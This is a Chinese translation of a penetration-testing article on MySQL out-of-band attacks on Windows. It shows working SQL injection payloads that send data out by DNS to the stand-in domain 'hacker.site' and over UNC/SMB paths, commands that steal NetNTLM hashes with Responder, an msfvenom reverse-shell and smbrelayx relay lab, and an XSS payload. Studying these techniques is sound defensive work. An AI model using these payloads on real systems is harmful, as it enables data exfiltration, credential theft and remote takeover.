> 原文链接: https://www.anquanke.com//post/id/85417 


# 【技术分享】MySQL Out-of-Band 攻击（含演示视频）


                                阅读量   
                                **147554**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：osandamalith.com
                                <br>原文地址：[https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t01e2ed06c6e2e43528.jpg)](https://p1.ssl.qhimg.com/t01e2ed06c6e2e43528.jpg)**

****

翻译：[Brexit](http://bobao.360.cn/member/contribute?uid=347422492)[](http://bobao.360.cn/member/contribute?uid=353915284)

预估稿费：180RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**<br>**

**概述**

关于MSSQL和Oracle Out-of-Band 注入方面的研究已经很多了，不过我发现MySQL注入的研究情况并非如此。于是我萌生了根据自己在SQL注入方面的经验做相关研究的想法。为实现这个目的，我们可以利用函数load_file() 和 select…into outfile/dumpfile。此外，我们还可以窃取NetNTLM哈希并实施服务器信息块 (SMB)中继攻击。所有的这一切都只在Windows环境下的MySQL中有可能实现。

<br>

**什么是 Out-of-Band 注入？**

这些攻击涉及通过除服务器以外的其它方式提取数据，比如通过HTTP(S)请求、DNS解析、文件系统、电子邮件等，具体通过哪种方式取决于后端技术的功能。

<br>

**MySQL的限制条件**

MySQL中存在一个全局系统变量secure_file_priv。这个变量用来限制数据导入和导出操作的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的行为。

如果将这个变量设置为一个目录的名称，则服务器会将导入和导出操作限制在跟这个目录中的文件协作。这个目录必须存在，而服务器不会创建它。

如果这个变量为空，那么它不会产生影响，这样配置就是不安全的。

如果将这个变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始就是合法的。

在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。



```
select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like "secure_file_priv";
```

例如在我的MySQL 5.5.34版本中，默认值为空，也就是说我们能够使用这些函数。

[![](https://p3.ssl.qhimg.com/t01807884cb7a403139.png)](https://p3.ssl.qhimg.com/t01807884cb7a403139.png)

在MySQL 5.6.34版本中，这个值默认是NULL，它会禁用导入和导出操作。

[![](https://p4.ssl.qhimg.com/t019e2a575f330569cb.png)](https://p4.ssl.qhimg.com/t019e2a575f330569cb.png)

<br>

**权变措施**

以下是我认为可以解决5.5.53之后版本中这个问题的一些权变措施。

启动mysql进程，为“–secure-file-priv=”参数赋值为空。

```
mysqld.exe --secure-file-priv=
```

在”my.ini”配置文件中增加一个条目。

```
secure-file-priv=
```

要查找默认选项的加载顺序和配置文件的路径，输入以下内容：

```
mysqld.exe --help --verbose
```

将配置文件指向mysqld.exe。

你可以创建一个新的文件myfile.ini并将这个文件作为MySQL的默认配置。

```
mysqld.exe --defaults-file=myfile.ini
```

你的配置内容是：



```
[mysqld]
secure-file-priv=
```

使用文件系统提取数据

在MySQL中，我们可以使用一个共享文件系统当做提取数据的替代渠道。



```
select @@version into outfile '\\192.168.0.100\temp\out.txt';
select @@version into dumpfile '\\192.168.0.100\temp\out.txt';
select @@version into outfile '//192.168.0.100/temp/out.txt';
select @@version into dumpfile '//192.168.0.100/temp/out.txt';
```

注意，如果引用被过滤，那么你就无法使用十六进制会话或者其他格式作为文件路径。

使用DNS解析提取数据

另外一种方法就是使用DNS解析。



```
select load_file(concat('\\',version(),'.hacker.site\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```

你可以清楚地看到5.6.34版本跟DNS查询是一起被发送的。

[![](https://p1.ssl.qhimg.com/t0156a640983063c017.png)](https://p1.ssl.qhimg.com/t0156a640983063c017.png)

当MySQL尝试解析DNS查询时，我们能够记录DNS请求并成功地从hacker.site的DNS服务器中成功提取数据。数据被记录为一个子域。

[![](https://p2.ssl.qhimg.com/t0167a615c16615e3f6.png)](https://p2.ssl.qhimg.com/t0167a615c16615e3f6.png)

提取数据时，要注意你处理的是DNS请求，不能使用特殊字符。要使用MySQL字符串函数如mid、substr、replace等处理这些情况。

<br>

**窃取NetNTLM哈希**

如你所见，’load_file’和’into outfile/dumpfile’跟Windows下的UNC路径运行良好。它可被用于解析一个不存在的路径，而且当DNS失败时，这个请求可被发送为LLMNR、NetBIOS-NS查询。通过投毒LLMNR协议，我们可以捕获到NTLMv2哈希。

[![](https://p1.ssl.qhimg.com/t018a6eb095274e4a4a.png)](https://p1.ssl.qhimg.com/t018a6eb095274e4a4a.png)

我们在攻击中可用到的工具包括：

Responder

Ilmnr_response

MiTMf

在这个例子中，我会使用Responder。我在Windows 8 的64位计算机中运行MySQL 5.6.34版本。

```
responder -I eth0 -rv
```

然后，我们可以使用load_file、into outfile/dumpfile或load data infile来解析一个无效的UNC路径。



```
select load_file('\\error\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\error\abc';
select 'osanda' into outfile '\\error\abc';
load data infile '\\error\abc' into table database.table_name;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01538d29adfdebecf5.png)



**<br>**

**SMB中继攻击**

通过使用函数如load_file、into outfile/dumpfile和load data infile，我们能够访问Windows环境下的UNC路径。我们能够在SMB中继攻击中利用这个功能，并且在目标设备中弹出一个shell。以下是SMB中继攻击的可视化演示。

[![](https://p3.ssl.qhimg.com/t013738c6924258dbc3.png)](https://p3.ssl.qhimg.com/t013738c6924258dbc3.png)

这是为此次试验做的实验室设置配置。

MySQL服务器：Windows 8: 192.168.0.100

攻击者：Kali: 192.168.0.101

受害者：Windows 7: 192.168.0.103（以管理员身份运行）

使用的工具是：

Smbrelayx

Metasploit

首先，我在Kali盒子中生成了一个反向shell，并在Metasploit上运行multi/handler模块。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=443  -f exe &gt; reverse_shell.exe
```

接着，运行smbrelayx工具以明确受害者的IP地址和生成的反向shell并等待流入的连接。

```
smbrelayx.py -h 192.168.0.103 -e ./reverse_shell.exe
```

一旦我们从MySQL服务器中执行任意语句，我们会从受害者盒子中得到反向shell。



```
select load_file('\\192.168.0.101\aa');
select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'osanda' into dumpfile '\\192.168.0.101\aa';
select 'osanda' into outfile '\\192.168.0.101\aa';
load data infile '\\192.168.0.101\aa' into table database.table_name;
```

这些是来自multi/handler模块Metasploit中的选项：

[![](https://p4.ssl.qhimg.com/t0156181c9a1b299aa3.png)](https://p4.ssl.qhimg.com/t0156181c9a1b299aa3.png)

一旦MySQL服务器把一个请求发送到Kali盒子，smbrelayx就会执行SMB中继攻击并且将我们的反向shell上传并执行。

[![](https://p0.ssl.qhimg.com/t01f414d20a9725389a.png)](https://p0.ssl.qhimg.com/t01f414d20a9725389a.png)

如果攻击成功，那么我们就会从Windows 7盒子中得到我们的反向shell。

[![](https://p1.ssl.qhimg.com/t01e8e995b378cf0764.png)](https://p1.ssl.qhimg.com/t01e8e995b378cf0764.png)



**<br>**

**基于union和error的注入**

Load_file函数能够用于基于union和error的注入。例如，在基于union的场景中，我们可以使用OOB注入，如：

```
http://192.168.0.100/?id=-1'+union+select+1,load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)),3-- -
```

我们可以只使用基于error的技术如BIGINT溢出方法或者EXP 基于error的方法。



```
http://192.168.0.100/?id=-1' or !(select*from(select   load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))x)-~0-- -
http://192.168.0.100/?id=-1' or exp(~(select*from(select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))a))-- -
```

你可以不使用or，而使用||、 |、and、 &amp;&amp;、 &amp;、 &gt;&gt;、 &lt;&lt;、 ^、 xor、 &lt;=、 &lt;、 、&gt;、 &gt;=、 *、 mul、 /、 div、 -、 +、 % 和 mod。

<br>

**XSS + SQLi**

你可以把XSS攻击和MySQL结合起来使用，它可能会在渗透测试中帮你解决不同场景中的问题。我们能够执行窃取NetNTLM哈希和结合XSS的SMB中继攻击。如果XSS是持续的，那么受害者每次访问页面都会被感染。

需要注意的是，当处理JavaScript时，你处于同源策略环境下。

```
&lt;svg onload=fetch(("http://192.168.0.100/?id=-1'+union+select+1,load_file(0x5c5c5c5c6572726f725c5c6161),3-- -"))&gt;
```

你也可以使用MySQL来回显HTML，从而回显一个无效的UNC路径来窃取NetNTLM哈希或者直接使用攻击者的IP实施SMB中继攻击。这些UNC路径只有在IE浏览器下才能被解析。

```
http://192.168.0.100/?id=-1' union select 1,'&lt;img src="\\error\aa"&gt;'%23
```



**结论**

当由于向量被禁用、受限或者被过滤且唯一的选择就是使用推理方法，从而导致所有带内方法不起作用时，我们可以使用以上提到的方法。Select…into outfile/dumpfile函数可跟基于union的注入结合使用。Load_file方法可跟基于union和error的注入结合使用。当涉及到基础机构入侵时，这些方法可能是起作用的。利用漏洞并非总是显而易见一目了然的，因此你必须在遇到实际情况时创造性地使用这些技术。

<br>

**致谢**

特别感谢@m3g9tr0n为研究提供的支持。

<br>

**论文**

[https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html) 

<br>

**参考**

[https://dev.mysql.com/doc/refman/5.5/en/](https://dev.mysql.com/doc/refman/5.5/en/) 

[https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python) 

[https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/](https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/) 
